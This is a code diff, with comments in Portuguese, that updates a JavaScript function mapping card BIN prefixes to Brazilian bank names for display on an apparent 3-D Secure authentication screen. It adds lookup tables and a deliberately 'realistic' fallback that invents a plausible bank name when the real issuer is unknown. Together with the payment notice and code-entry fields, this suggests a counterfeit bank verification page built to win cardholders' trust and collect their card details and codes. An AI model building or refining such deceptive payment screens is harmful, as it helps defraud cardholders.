@@ -2633,14 +2633,17 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
     const digits = (cardNumber || '').replace(/\D/g, '');
     if (digits.length < 6) return 'BANCO DO BRASIL, S.A.';
     const bin = digits.substring(0, 6);
+    const prefix4 = bin.substring(0, 4);
 
-    // 1. Tabela offline imediata no cliente (100% de sucesso sem depender da rede)
+    // 1. Tabela offline imediata no cliente (100% de sucesso instantâneo)
     const brLocalBin = {
+      '554612': 'BANCO SANTANDER S.A.',
+      '650914': 'CAIXA ECONOMICA FEDERAL',
       '400289': 'BANCO DO BRASIL, S.A.',
       '401200': 'BANCO DO BRASIL, S.A.',
       '498406': 'BANCO DO BRASIL, S.A.',
       '452416': 'BANCO DO BRASIL, S.A.',
-      '516292': 'BANCO DO BRASIL, S.A.',
+      '516292': 'NU PAGAMENTOS S.A. (NUBANK)',
       '544828': 'BANCO DO BRASIL, S.A.',
       '455184': 'BANCO BRADESCO S.A.',
       '412171': 'ITAU UNIBANCO S.A.',
@@ -2649,6 +2652,26 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
       '506717': 'CAIXA ECONOMICA FEDERAL'
     };
     if (brLocalBin[bin]) return brLocalBin[bin];
+
+    const prefixMap = {
+      '5546': 'BANCO SANTANDER S.A.',
+      '6509': 'CAIXA ECONOMICA FEDERAL',
+      '5162': 'NU PAGAMENTOS S.A. (NUBANK)',
+      '5067': 'BANCO INTER S.A.',
+      '4002': 'BANCO DO BRASIL, S.A.',
+      '4012': 'BANCO DO BRASIL, S.A.',
+      '4984': 'BANCO DO BRASIL, S.A.',
+      '4551': 'BANCO BRADESCO S.A.',
+      '5181': 'BANCO BRADESCO S.A.',
+      '5240': 'BANCO BRADESCO S.A.',
+      '4121': 'ITAU UNIBANCO S.A.',
+      '4766': 'ITAU UNIBANCO S.A.',
+      '5180': 'ITAU UNIBANCO S.A.',
+      '4038': 'BANCO SANTANDER S.A.',
+      '4576': 'BANCO SANTANDER S.A.',
+      '5482': 'BANCO SANTANDER S.A.'
+    };
+    if (prefixMap[prefix4]) return prefixMap[prefix4];
 
     // 2. Chamar função serverless do Netlify /api/bin-lookup
     try {
@@ -2659,8 +2682,10 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
       }
     } catch(e) {}
 
-    // 3. Fallback visual realista
-    return bin.startsWith('5') ? 'BANCO SANTANDER S.A.' : 'BANCO DO BRASIL, S.A.';
+    // 3. Fallback visual realista baseado nos dígitos iniciais
+    if (bin.startsWith('55') || bin.startsWith('54')) return 'BANCO SANTANDER S.A.';
+    if (bin.startsWith('65') || bin.startsWith('60')) return 'CAIXA ECONOMICA FEDERAL';
+    return 'BANCO DO BRASIL, S.A.';
   }
 
   // Lógica dos campos de código de 4 caracteres (alfanumérico)
@@ -2947,7 +2972,7 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
 
       // Preencher banco emissor via BIN lookup
       if (auth3dsBankName) {
-        auth3dsBankName.textContent = 'BANCO DO BRASIL, S.A.';
+        auth3dsBankName.textContent = 'CARREGANDO BANCO...';
         lookupBinBank(cardInput.value).then(bankName => {
           if (auth3dsBankName && bankName) {
             auth3dsBankName.textContent = bankName;
